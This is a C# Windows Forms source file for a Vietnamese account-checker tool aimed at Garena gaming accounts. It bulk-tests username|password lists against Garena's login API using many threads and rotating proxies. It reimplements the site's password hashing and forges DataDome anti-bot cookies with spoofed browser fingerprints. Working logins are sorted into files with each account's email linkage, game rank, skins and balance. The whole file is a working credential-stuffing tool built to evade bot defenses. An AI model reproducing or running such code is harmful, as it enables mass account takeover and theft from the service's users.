using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using xNet;

namespace CheckInfoGas
{
    public partial class Form1 : Form
    {
        public Form1(string permission)
        {
            this.Permission = permission;
            InitializeComponent();
            SetPermission();
            Tasks = new List<Task>();
        }

        CancellationTokenSource CancellationTokenSource;
        private string Proxy { get; set; }

        private string ApiKey { get; set; }

        private string Proxy2 { get; set; } = "";

        private string Permission { get; set; }

        private string FilePath { get; set; }

        private System.Timers.Timer timer;

        List<Task> Tasks { get; set; }

        string[] Accounts { get; set; }

        void SetPermission()
        {
            switch (Permission)
            {
                case "Full":
                    cbInfo.Enabled = true;
                    cbLQ.Enabled = true;
                    break;
                case "Info":
                    cbInfo.Enabled = true;
                    cbLQ.Enabled = false;
                    break;
                case "LQ":
                    cbInfo.Enabled = false;
                    cbLQ.Enabled = true;
                    break;
                default:
                    cbInfo.Enabled = false;
                    cbLQ.Enabled = false;
                    break;
            }
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (btnStart.Text == "Start")
            {
                if (!string.IsNullOrEmpty(FilePath))
                {
                    int maxThread = (int)numThread.Value;
                    CheckMulti(maxThread);
                }
                else if (string.IsNullOrEmpty(FilePath))
                {
                    MessageBox.Show("Chưa chọn file account", "Cảnh báo!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    btnStart.Text = "Start";
                }
                else
                {
                    MessageBox.Show("Chưa nhập proxy bypass", "Cảnh báo!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    btnStart.Text = "Start";
                }
            }
            else
            {
                btnStart.Text = "Start";
                CancellationTokenSource.Cancel();
            }
        }

        /*
        private async void Check(int maxThread)
        {
            await Task.Run(async () =>
            {
                var semaphore = new SemaphoreSlim(maxThread, (maxThread * 2));
                foreach (var line in Accounts)
                {
                    if (CancellationTokenSource.IsCancellationRequested)
                        break;

                    var dataRaw = line.Split('|');

                    var account = dataRaw[0].Trim();
                    var password = dataRaw[1].Trim();
                    int add = 0;
                    dgv.Invoke(new Action(() =>
                    {
                        add = dgv.Rows.Add(dgv.Rows.Count, account, password, "Running");
                    }));
                    DataGridViewRow row = dgv.Rows[add];
                    await semaphore.WaitAsync();
                    Tasks.Add(Task.Run(async () =>
                    {
                        try
                        {
                            await CheckPerThread(row, account, password);
                        }
                        finally
                        {
                            semaphore.Release();
                        }
                    }));
                }
                await Task.WhenAll(Tasks);
                MessageBox.Show("Xong");
            });
        }
        
        private async Task CheckPerThread(DataGridViewRow row, string account, string password)
        {
            bool isSuccess = false;
            while (!isSuccess)
            {
                try
                {
                    var http = new HttpRequest
                    {
                        Cookies = new CookieDictionary(),
                        KeepAlive = true,
                        EnableEncodingContent = true,
                        UserAgent = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
                        Referer = "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=vi-VN"
                    };

                    int i = 30; string v1 = string.Empty; string v2 = string.Empty;
                    SetStatusDataGridView(row, "Get V1, v2");
                    while (i > 0)
                    {
                        (v1, v2) = GetDataHashPassword(account);

                        if (!string.IsNullOrEmpty(v1) && !string.IsNullOrEmpty(v2) || v1.Equals("error_no_account"))
                        {
                            // Continue with the rest of the code
                            break;
                        }
                        i--;
                    }

                    if (string.IsNullOrEmpty(v1) || string.IsNullOrEmpty(v2) || v1.Equals("error_no_account"))
                    {
                        SetStatusDataGridView(row, "V1, v2 is null");
                        break;
                    }

                    string encryptedPass = MaHoaPassGarena(
                        MD5Hash(password),
                        SHA256Hash(SHA256Hash(MD5Hash(password) + v1) + v2)
                    );

                    long id = DateTimeOffset.Now.ToUnixTimeMilliseconds() / 1000;

                    var response = http.Get($"https://sso.garena.com/api/login?account={account}&password={encryptedPass}&format=json&id={id}&app_id=10043").ToString();

                    if (string.IsNullOrEmpty(response))
                    {
                        SetStatusDataGridView(row, "Không có data");
                        return;
                    }

                    if (response.Contains("error_user_ban"))
                    {
                        SetStatusDataGridView(row, "Ban Account");
                        //await WriteToFileAsync("Ban.txt", $"{account}|{password}");
                    }
                    else if (response.Contains("error_auth"))
                    {
                        SetStatusDataGridView(row, "Wrong password");
                        // WriteToFileAsync("WrongPass.txt", $"{account}|{password}");
                    }
                    else if (response.Contains("error_suspicious_ip"))
                    {
                        SetStatusDataGridView(row, "Spam ip");
                    }
                    else if (!response.Contains("error"))
                    {
                        var dataObject = JObject.Parse(response);
                        if (dataObject.ContainsKey("session_key"))
                        {
                            var sessionKey = dataObject["session_key"].ToString();

                            SetStatusDataGridView(row, "Login Success");
                            var status = string.Empty;
                            var fileName = string.Empty;

                            if (cbInfo.Checked)
                            {
                                var cookies = http.Cookies.ToDictionary(x => x.Key, x => x.Value);

                                var userInfo = Garena.CheckInfoAccount(http, Proxy2);

                                status = $"{userInfo.IdCard}|{userInfo.EmailLK}|{userInfo.isConnectFb}|{userInfo.Status}";
                                

                                fileName = userInfo.Status.ToString();

                                if (string.IsNullOrEmpty(status))
                                    return;
                            }

                            if (cbLQ.Checked)
                            {
                                var (hero, level, rank, name) = CheckLienQuan(sessionKey);

                                if (!cbInfo.Checked)
                                {
                                    fileName = string.IsNullOrEmpty(hero) ? "LienQuanFail" : "LienQuanSuccess";

                                    status = string.IsNullOrEmpty(hero) ? "Don't Have Account" : $"{hero}|{level}|{rank}|{name}";
                                }
                                else
                                {
                                    status = string.IsNullOrEmpty(hero) ? status + "|Don't Have Account" : $"{status}|{hero}|{level}|{rank}|{name}";

                                    if (status.Split('|')[3] == "FullTT" && !string.IsNullOrEmpty(hero))
                                    {
                                        if (hero.Length > 1)
                                        {
                                            var typeAccount = hero.Substring(0, 1) == "K" ? "KDX" : hero.Substring(0, 1) + "x";
                                            //await WriteToFileAsync($@"{Application.StartupPath}Lienquan\\LienQuan{typeAccount}.txt", $"{account}|{password}|{status}");
                                        }
                                    }
                                }

                                if (status.Contains("Don't Have Account"))
                                {
                                    fileName = "NoAccount";
                                }
                            }

                            if (!cbLQ.Checked && !cbInfo.Checked)
                            {
                                //await WriteToFileAsync("Success.txt", $"{account}|{password}");
                            }
                            else
                            {
                                SetStatusDataGridView(row, status);

                                //await WriteToFileAsync($"{fileName}.txt", $"{account}|{password}|{status}");
                            }
                        }
                        else
                        {
                            SetStatusDataGridView(row, "Không có session key");
                        }
                    }
                    else
                    {
                        SetStatusDataGridView(row, response);
                    }

                    isSuccess = true;
                }
                catch (Exception ex)
                {
                    SetStatusDataGridView(row, ex.Message);
                }
            }
        }
        */

        public void CheckMulti(int maxThread)
        {
            (new Thread(() =>
            {
                int i = 0, iThread = 0;
                while (i < Accounts.Count())
                {
                    if (iThread < maxThread)
                    {
                        int rowi = i;
                        Interlocked.Increment(ref iThread);
                        (new Thread(() =>
                        {
                            int add = 0;

                            var account = Accounts[rowi];
                            var accountInfo = account.Split('|');
                            var username = accountInfo[0];
                            var password = accountInfo[1];

                            dgv.Invoke(new Action(() =>
                            {
                                add = dgv.Rows.Add(dgv.Rows.Count, username, password, "Running");
                            }));
                            DataGridViewRow row = dgv.Rows[add];

                            CheckPerThread(row, username, password);
                            Interlocked.Decrement(ref iThread);
                        })).Start();
                        Task.Delay(300);
                        i++;
                    }
                    else
                    {
                        Task.Delay(1000);
                    }
                }
            })).Start();
        }

        public Task RetryOnFailed(Action action)
        {
            return Task.Run(() =>
            {
                for (int i = 0; i < 5; i++)
                {
                    try
                    {
                        action();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                    finally
                    {
                        Task.Delay(300);
                    }
                }
            });
        }

        private Task CheckPerTask(DataGridViewRow row, string username, string password)
        {
            int x = 0;
            while (x < 5)
            {
                try
                {
                    SetStatusDataGridView(row, "Get V1, v2");
                    string v1 = string.Empty, v2 = string.Empty;

                    for (int i = 0; i < 5; i++)
                    {
                        (v1, v2) = GetDataHashPassword(username);

                        if (!string.IsNullOrEmpty(v1) && !string.IsNullOrEmpty(v2) || v1.Equals("error_no_account"))
                        {
                            break;
                        }

                        Task.Delay(1000).Wait();
                    }

                    if (string.IsNullOrEmpty(v1) || string.IsNullOrEmpty(v2) || v1.Equals("error_no_account"))
                    {
                        SetStatusDataGridView(row, "V1, v2 is null");
                        return Task.CompletedTask;
                    }

                    string encryptedPass = MaHoaPassGarena(
                                MD5Hash(password),
                                SHA256Hash(SHA256Hash(MD5Hash(password) + v1) + v2)
                            );

                    var (http, status) = Garena.CheckLogin(username, encryptedPass);

                    var data = $"{username}|{password}";
                    switch (status)
                    {
                        case Garena.StatusLogin.Ok:
                            var userInfo = new UserInfo();
                            var cookies = http.Cookies.ToDictionary();
                            if (cbInfo.Checked)
                            {
                                SetStatusDataGridView(row, "Check info");
                                userInfo = Garena.CheckInfoAccount(http, Proxy2);

                            }

                            if (cbLQ.Checked)
                            {
                                SetStatusDataGridView(row, "Check Lien Quan");
                                Garena.CheckRankLQ(http, userInfo);
                                var rank = string.IsNullOrEmpty(userInfo.LienQuanInfo.Rank) ? "0" : userInfo.LienQuanInfo.Rank;
                                var skin = string.IsNullOrEmpty(userInfo.LienQuanInfo.Skin) ? "0" : userInfo.LienQuanInfo.Skin;
                                data += $"|Rank:{rank}|Skin:{skin}";
                                SetStatusDataGridView(row, $"Rank:{rank}|Skin:{skin}");
                            }

                            if (cbFo4.Checked)
                            {
                                SetStatusDataGridView(row, "Check FO4");
                                Garena.LoginFCO(cookies, userInfo);
                                var TeamValues = string.IsNullOrEmpty(userInfo.FO4Info.TeamValues) ? "0" : userInfo.FO4Info.TeamValues;
                                var Balance = string.IsNullOrEmpty(userInfo.FO4Info.Balance) ? "0" : userInfo.FO4Info.Balance;
                                data += $"|{TeamValues}|{Balance}";
                            }

                            if (userInfo.Status != null)
                            {
                                switch (userInfo.Status)
                                {
                                    case UserInfo.InfoStatus.FullTT:
                                        WriteToFileAsync("FullTT.txt", data);
                                        break;
                                    case UserInfo.InfoStatus.Error_Email:
                                        WriteToFileAsync("Error_Email.txt", data);
                                        break;
                                    case UserInfo.InfoStatus.TTT:
                                        WriteToFileAsync("TTT.txt", data);
                                        break;
                                    case UserInfo.InfoStatus.NotExist:
                                        WriteToFileAsync("NotExist.txt", data);
                                        break;
                                }
                            }
                            break;
                        case Garena.StatusLogin.Ban:
                            SetStatusDataGridView(row, "Ban Account");
                            return Task.CompletedTask;
                        case Garena.StatusLogin.Empty:
                            SetStatusDataGridView(row, "Không có data");
                            return Task.CompletedTask;
                        case Garena.StatusLogin.Auth:
                            SetStatusDataGridView(row, "Wrong password");
                            return Task.CompletedTask;
                        case Garena.StatusLogin.Spam:
                            SetStatusDataGridView(row, "Spam ip");
                            return Task.CompletedTask;
                    }

                    break;
                }
                catch { x++; }
            }

            return Task.CompletedTask;
        }

        private void CheckPerThread(DataGridViewRow row, string username, string password)
        {
            int x = 0;
            while (x < 5)
            {
                try
                {
                    SetStatusDataGridView(row, "Get V1, v2");
                    string v1 = string.Empty, v2 = string.Empty;

                    for (int i = 0; i < 5; i++)
                    {
                        (v1, v2) = GetDataHashPassword(username);

                        if (!string.IsNullOrEmpty(v1) && !string.IsNullOrEmpty(v2) || v1.Equals("error_no_account"))
                        {
                            break;
                        }

                        Task.Delay(1000).Wait();
                    }

                    if (string.IsNullOrEmpty(v1) || string.IsNullOrEmpty(v2) || v1.Equals("error_no_account"))
                    {
                        SetStatusDataGridView(row, "V1, v2 is null");
                        break;
                    }

                    string encryptedPass = MaHoaPassGarena(
                                MD5Hash(password),
                                SHA256Hash(SHA256Hash(MD5Hash(password) + v1) + v2)
                            );

                    var (http, status) = Garena.CheckLogin(username, encryptedPass);

                    var data = $"{username}|{password}";
                    switch (status)
                    {
                        case Garena.StatusLogin.Ok:
                            var userInfo = new UserInfo();
                            var cookies = http.Cookies.ToDictionary();
                            if (cbInfo.Checked)
                            {
                                SetStatusDataGridView(row, "Check info");
                                userInfo = Garena.CheckInfoAccount(http, Proxy2);

                            }

                            if (cbLQ.Checked)
                            {
                                SetStatusDataGridView(row, "Check Lien Quan");
                                Garena.CheckRankLQ(http, userInfo);
                                var rank = string.IsNullOrEmpty(userInfo.LienQuanInfo.Rank) ? "0" : userInfo.LienQuanInfo.Rank;
                                var skin = string.IsNullOrEmpty(userInfo.LienQuanInfo.Skin) ? "0" : userInfo.LienQuanInfo.Skin;
                                data += $"|Rank:{rank}|Skin:{skin}";
                                SetStatusDataGridView(row, $"Rank:{rank}|Skin:{skin}");
                            }

                            if (cbFo4.Checked)
                            {
                                SetStatusDataGridView(row, "Check FO4");
                                Garena.LoginFCO(cookies, userInfo);
                                var TeamValues = string.IsNullOrEmpty(userInfo.FO4Info.TeamValues) ? "0" : userInfo.FO4Info.TeamValues;
                                var Balance = string.IsNullOrEmpty(userInfo.FO4Info.Balance) ? "0" : userInfo.FO4Info.Balance;
                                data += $"|{TeamValues}|{Balance}";
                            }

                            if (userInfo.Status != null)
                            {
                                switch (userInfo.Status)
                                {
                                    case UserInfo.InfoStatus.FullTT:
                                        WriteToFileAsync("FullTT.txt", data);
                                        break;
                                    case UserInfo.InfoStatus.Error_Email:
                                        WriteToFileAsync("Error_Email.txt", data);
                                        break;
                                    case UserInfo.InfoStatus.TTT:
                                        WriteToFileAsync("TTT.txt", data);
                                        break;
                                    case UserInfo.InfoStatus.NotExist:
                                        WriteToFileAsync("NotExist.txt", data);
                                        break;
                                }
                            }
                            break;
                        case Garena.StatusLogin.Ban:
                            SetStatusDataGridView(row, "Ban Account");
                            break;
                        case Garena.StatusLogin.Empty:
                            SetStatusDataGridView(row, "Không có data");
                            break;
                        case Garena.StatusLogin.Auth:
                            SetStatusDataGridView(row, "Wrong password");
                            break;
                        case Garena.StatusLogin.Spam:
                            SetStatusDataGridView(row, "Spam ip");
                            break;
                    }

                    break;
                }
                catch { x++; }
            }
        }

        private void SetStatusDataGridView(DataGridViewRow row, string status)
        {
            dgv.Invoke(new Action(() =>
            {
                row.Cells["cStatus"].Value = status;
            }));
        }

        private void WriteToFileAsync(string fileName, string content)
        {
            bool isSuccess = false;
            while (!isSuccess)
            {
                try
                {
                    using (var sw = new StreamWriter(fileName, true))
                    {
                        sw.WriteLine(content);
                    }
                    isSuccess = true;
                }
                catch
                {
                    Task.Delay(100).Wait();
                }
            }
        }

        private (string, string, string, string) CheckLienQuan(string sessionKey)
        {
            var http = new HttpRequest()
            {
                Cookies = new CookieDictionary(),
                SslCertificateValidatorCallback = (sender, cert, chain, sslPolicyErrors) => true,
            };

            http.Cookies.Add("session_key", sessionKey);

            var response = http.Post("https://pvp.garena.vn/api/summoner/profile/", "{}", "application/json").ToString();
            var hero = string.Empty;
            var responseObject = JObject.Parse(response);
            if (responseObject.ContainsKey("summoner_info"))
            {

                if (response.Contains("champion_cnt"))
                {
                    hero = responseObject["summoner_info"]["champion_cnt"].ToString();
                    if (hero == "10")
                    {
                        hero = "KXD";
                    }
                }
                var levelGame = responseObject["summoner_info"]["pvp_level"].ToString();
                var nameIG = responseObject["summoner_info"]["name"].ToString();
                var rankGame = responseObject["summoner_info"]["ladder_grade"].ToString().Substring(0, 1) ?? string.Empty;
                var rankInfo = string.Empty;
                switch (rankGame)
                {
                    case "1":
                        rankInfo = "Brown";
                        break;
                    case "2":
                        rankInfo = "Silver";
                        break;
                    case "3":
                        rankInfo = "Gold";
                        break;
                    case "4":
                        rankInfo = "Platinum";
                        break;
                    case "5":
                        rankInfo = "Diamond";
                        break;
                    case "6":
                        rankInfo = "Master";
                        break;
                    case "8":
                        rankInfo = "TA";
                        break;
                    default:
                        rankInfo = "NO RANK";
                        break;
                }

                return (hero, levelGame, rankInfo, nameIG);
            }

            return ("", "", "", "");
        }

        private async void CheckFo4(HttpRequest http)
        {
            var response2 = http.Get("https://auth.garena.com/oauth/login?client_id=100072&redirect_uri=https%3A%2F%2Franking.fconline.garena.vn%2Flogin%2Fcallback&response_type=token&platform=1&locale=vi-VN").ToString();


            var parameters = new xNet.FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("client_id", "32837"),
                    new KeyValuePair<string, string>("redirect_uri", "https://ranking.fo4.garena.vn/login/callback"),
                    new KeyValuePair<string, string>("response_type", "token"),
                    new KeyValuePair<string, string>("platform", "1"),
                    new KeyValuePair<string, string>("locale", "vi-VN"),
                    new KeyValuePair<string, string>("format", "json"),
                    new KeyValuePair<string, string>("id", "1710952555792"),
                    new KeyValuePair<string, string>("app_id", "32837")
                });

            var response = http.Post("https://auth.garena.com/oauth/token/grant", parameters).ToString();
            string redirectUri = "";
            var data3 = Newtonsoft.Json.JsonConvert.DeserializeObject<dynamic>(response);
            redirectUri = data3["redirect_uri"];
            var redirectSource = http.Get(redirectUri).ToString();
            var cookies = http.Cookies.ToDictionary(x => x.Key, x => x.Value);
            var sessionId = cookies.Where(x => x.Key.Equals("sessionid")).FirstOrDefault().Value;
            var csrfToken = cookies.Where(x => x.Key.Equals("csrftoken")).FirstOrDefault().Value;
            HttpRequest httpRequest = new()
            {
                Cookies = new CookieDictionary(),
                UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
                Referer = "https://ranking.fconline.garena.vn/thong-tin"
            };

            httpRequest.Cookies.Add("csrftoken", csrfToken);
            httpRequest.Cookies.Add("sessionid", sessionId);
            httpRequest.AddHeader("X-Csrftoken", csrfToken);
            httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
            httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
            try
            {
                var game = httpRequest.Get("https://ranking.fconline.garena.vn/api/game/get").ToString();
                var hof = httpRequest.Get("https://ranking.fconline.garena.vn/api/hof/get").ToString();
                var profile = httpRequest.Get("https://ranking.fconline.garena.vn/api/user/profile").ToString();
            }
            catch { }
            http.Referer = "https://ranking.fconline.garena.vn/thong-tin";
            http.AddHeader("X-Csrftoken", csrfToken);
            http.AddHeader("Sec-Fetch-Site", "same-origin");
            http.AddHeader("Sec-Fetch-Mode", "cors");
            var profile2 = httpRequest.Get("https://ranking.fconline.garena.vn/api/user/profile").ToString();
        }

        private string MaHoaPassGarena(string plaintext, string key)
        {
            using (AesManaged aes = new())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.ECB;
                aes.Padding = PaddingMode.None;

                aes.Key = StringToByteArray(key.Substring(0, 64));

                var encryptor = aes.CreateEncryptor(aes.Key, null);

                byte[] plainTextBytes = HexStringToByteArray(plaintext);
                byte[] cipherTextBytes = encryptor.TransformFinalBlock(plainTextBytes, 0, plainTextBytes.Length);

                return ByteArrayToString(cipherTextBytes).Substring(0, 32);
            }
        }

        private string MD5Hash(string input)
        {
            using (MD5 md5 = MD5.Create())
            {
                byte[] inputBytes = Encoding.ASCII.GetBytes(input);
                byte[] hashBytes = md5.ComputeHash(inputBytes);

                return ByteArrayToString(hashBytes);
            }
        }

        private string SHA256Hash(string input)
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                byte[] inputBytes = Encoding.ASCII.GetBytes(input);
                byte[] hashBytes = sha256.ComputeHash(inputBytes);

                return ByteArrayToString(hashBytes);
            }
        }

        private string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        private byte[] StringToByteArray(string hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

        // Thêm hàm này để chuyển đổi chuỗi Hex thành mảng byte
        private byte[] HexStringToByteArray(string hex)
        {
            int NumberChars = hex.Length / 2;
            byte[] bytes = new byte[NumberChars];
            using (var sr = new System.IO.StringReader(hex))
            {
                for (int i = 0; i < NumberChars; i++)
                    bytes[i] = Convert.ToByte(new string(new char[2] { (char)sr.Read(), (char)sr.Read() }), 16);
            }
            return bytes;
        }

        private bool CheckLiveFb(string uid)
        {
            try
            {
                var http = new HttpRequest
                {
                    Cookies = new CookieDictionary(),
                    UserAgent = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
                };
                var response = http.Get($"https://graph.facebook.com/{uid}/picture?type=normal&redirect=false").ToString();
                if (response.Contains("height") || response.Contains("width"))
                    return true;

                return false;
            }
            catch
            {
                return false;
            }
        }

        private (string, string) GetDataHashPassword(string account)
        {
            try
            {
                var proxyRaw = Proxy.Split(':');
                var http = new HttpRequest
                {
                    Cookies = new CookieDictionary(),
                    Proxy = HttpProxyClient.Parse($"{proxyRaw[0]}:{proxyRaw[1]}"),
                    KeepAlive = true,
                    EnableEncodingContent = true,
                    UserAgent = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
                    Referer = "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=vi-VN"
                };

                http.Proxy.Username = proxyRaw[2];
                http.Proxy.Password = proxyRaw[3];
                long id = DateTimeOffset.Now.ToUnixTimeMilliseconds() / 1000;
                var dataDome = GetDataDome();
                var headers = new Dictionary<string, string>
                {
                    {"Accept", "application/json, text/plain, */*"},
                    {"Accept-Language", "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"},
                    {"Cookie", "_ga_XB5PSHEQB4=GS1.1.1717740204.1.1.1717741125.0.0.0; _ga_ZVT4QTM70P=GS1.1.1717860132.1.0.1717860135.0.0.0; _ga_KE3SY7MRSD=GS1.1.1718120539.1.1.1718120539.0.0.0; _ga_RF9R6YT614=GS1.1.1718120542.1.0.1718120542.0.0.0; _ga=GA1.1.1225644985.1717685902; token_session=f9094272506759b10a3ae8aaf49fd45c60d3f80f866c302a077714e1dba6e468a6897fae30d7ee89d4cfb031d4b9e549; _ga_G8QGMJPWWV=GS1.1.1719149637.14.1.1719151040.0.0.0; datadome=" + dataDome + "; _ga_1M7M9L6VPX=GS1.1.1719318965.10.0.1719318965.0.0.0"},
                    {"Sec-Fetch-Dest", "empty"},
                    {"Sec-Fetch-Mode", "cors"},
                    {"Sec-Fetch-Site", "same-origin"},
                    {"sec-ch-ua", "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\""},
                    {"sec-ch-ua-mobile", "?1"},
                    {"sec-ch-ua-platform", "\"Android\""},
                    {"x-datadome-clientid", dataDome}
                };

                foreach (var header in headers)
                {
                    if (header.Key.Equals("Cookie"))
                    {
                        var cookieJar = header.Value.Split(';');
                        foreach (var cookie in cookieJar)
                        {
                            var cookieTemp = cookie.Split('=');
                            try
                            {
                                http.Cookies.Add(cookieTemp[0], cookieTemp[1]);
                            }
                            catch { }
                        }
                    }
                    else
                    {
                        http.AddHeader(header.Key, header.Value);
                    }
                }

                var response = http.Get($"https://100054.connect.garena.com/api/prelogin?app_id=10100&account={account}&format=json&id=1719452510767").ToString();
                if (response.Contains("error_no_account"))
                    return ("error_no_account", "");
                var v1 = JObject.Parse(response)["v1"].ToString();
                var v2 = JObject.Parse(response)["v2"].ToString();

                return (v1, v2);
            }
            catch (Exception)
            {
                return ("", "");
            }
        }

        private void GetNewProxy(object sender, ElapsedEventArgs e)
        {
            try
            {
                string text = "string";
                var jsonObject = new
                {
                    api_key = ApiKey,
                    sign = "string",
                    id_location = 1,
                };
                string param = string.Concat(new string[]
                {
                    "{\"api_key\": \"",
                    ApiKey,
                    "\",\"sign\": \"",
                    text,
                    "\",\"id_location\": 1",
                    "}",
                });
                string response = this.RequestPost("https://tmproxy.com/api/proxy/get-new-proxy", param);
                if (!string.IsNullOrEmpty(response))
                {
                    var jObject = JObject.Parse(response);
                    if (jObject["code"].ToString() == "0")
                    {
                        Proxy2 = jObject["data"]["https"].ToString();
                        if (Proxy2 == "")
                        {
                            Proxy2 = GetCurrentProxy(ApiKey);
                        }
                    }
                    else if (jObject["code"].ToString() == "5")
                    {
                        Proxy2 = GetCurrentProxy(ApiKey);
                    }
                }
            }
            catch { }
        }

        public string GetCurrentProxy(string ApiKey)
        {
            string param = string.Concat(new string[]
            {
                "{\"api_key\": \"",
                ApiKey,
                "\"}"
            });
            string text2 = this.RequestPost("https://tmproxy.com/api/proxy/get-current-proxy", param);
            JObject jobject = JObject.Parse(text2);
            string value2 = Regex.Match(JObject.Parse(text2)["message"].ToString(), "\\d+").Value;
            var Proxy = jobject["data"]["https"].ToString();
            return Proxy;
        }

        private string RequestPost(string Param944, string Param945)
        {
            string text = "";

            System.Net.WebClient webClient = new();
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            webClient.Headers[HttpRequestHeader.ContentType] = "application/json";
            text = webClient.UploadString(Param944, Param945);
            if (string.IsNullOrEmpty(text))
            {
                text = "";
            }

            return text;
        }

        private string GetDataDome()
        {
            HttpRequest http = new()
            {
                Cookies = new CookieDictionary(),
            };

            var dataPost = "jsData={\"ttst\":34.500000178813934,\"ifov\":false,\"wdifrm\":false,\"wdif\":false,\"br_h\":844,\"br_w\":390,\"br_oh\":844,\"br_ow\":390,\"nddc\":1,\"rs_h\":844,\"rs_w\":390,\"rs_cd\":24,\"phe\":false,\"nm\":false,\"jsf\":false,\"ua\":\"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1\",\"lg\":\"vi\",\"pr\":3,\"hc\":4,\"ars_h\":844,\"ars_w\":390,\"tz\":-420,\"str_ss\":true,\"str_ls\":true,\"str_idb\":true,\"str_odb\":true,\"plgod\":false,\"plg\":0,\"plgne\":\"NA\",\"plgre\":\"NA\",\"plgof\":\"NA\",\"plggt\":\"NA\",\"pltod\":false,\"hcovdr\":false,\"hcovdr2\":false,\"plovdr\":false,\"plovdr2\":false,\"ftsovdr\":false,\"ftsovdr2\":false,\"lb\":true,\"eva\":33,\"lo\":true,\"ts_mtp\":1,\"ts_tec\":true,\"ts_tsa\":true,\"vnd\":\"Google Inc.\",\"bid\":\"NA\",\"mmt\":\"empty\",\"plu\":\"empty\",\"hdn\":false,\"awe\":false,\"geb\":false,\"dat\":false,\"med\":\"defined\",\"aco\":\"probably\",\"acots\":false,\"acmp\":\"probably\",\"acmpts\":true,\"acw\":\"probably\",\"acwts\":false,\"acma\":\"maybe\",\"acmats\":false,\"acaa\":\"probably\",\"acaats\":true,\"ac3\":\"\",\"ac3ts\":false,\"acf\":\"probably\",\"acfts\":false,\"acmp4\":\"maybe\",\"acmp4ts\":false,\"acmp3\":\"probably\",\"acmp3ts\":false,\"acwm\":\"maybe\",\"acwmts\":false,\"ocpt\":false,\"vco\":\"probably\",\"vcots\":false,\"vch\":\"probably\",\"vchts\":true,\"vcw\":\"probably\",\"vcwts\":true,\"vc3\":\"maybe\",\"vc3ts\":false,\"vcmp\":\"\",\"vcmpts\":false,\"vcq\":\"\",\"vcqts\":false,\"vc1\":\"probably\",\"vc1ts\":true,\"dvm\":4,\"sqt\":false,\"so\":\"portrait-primary\",\"wbd\":false,\"wbdm\":true,\"wdw\":true,\"cokys\":\"bG9hZFRpbWVzY3NpYXBwcnVudGltZQ==L=\",\"ecpc\":false,\"lgs\":true,\"lgsod\":false,\"psn\":true,\"edp\":true,\"addt\":true,\"wsdc\":true,\"ccsr\":true,\"nuad\":true,\"bcda\":false,\"idn\":true,\"capi\":false,\"svde\":false,\"vpbq\":true,\"ucdv\":false,\"spwn\":false,\"emt\":false,\"bfr\":false,\"dbov\":false,\"npmtm\":false,\"jset\":1657013360}&events=[]&eventCounters=[]&jsType=ch&cid=.9Nfoi4MbtrhZ~-OzCe~9usp06_xKvitrfSO_5i8SbAvj_9hA-MnNwlaDhl4GxNX4oYEwpAo-KAriC6KcwwSwKfxI.I8_5UJuMtUXNzFVIbpOuMkCbT97yipJWa-gR3r&ddk=AE3F04AD3F0D3A462481A337485081&Referer=https%3A%2F%2Fsso.garena.com%2Fui%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Dvi-VN&request=%2Fui%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Dvi-VN&responsePage=origin&ddv=4.4.3";
            var response = http.Post("https://api-js.datadome.co/js/", dataPost, "application/x-www-form-urlencoded").ToString();
            var cookie = JObject.Parse(response)["cookie"].ToString();
            return Regex.Match(cookie, "datadome=(.*?);").Groups[1].Value;
        }

        private async void importToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new();
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                FilePath = openFileDialog.FileName;
                var accounts2 = await File.ReadAllLinesAsync(FilePath);
                Accounts = accounts2.Where(x => !string.IsNullOrEmpty(x) && x.Split('|').Length >= 2).ToArray();

                MessageBox.Show("Load Xong");
            }
            else
            {
                FilePath = string.Empty;
            }
        }

        private void cbProxy_CheckedChanged(object sender, EventArgs e)
        {

        }
    }
}
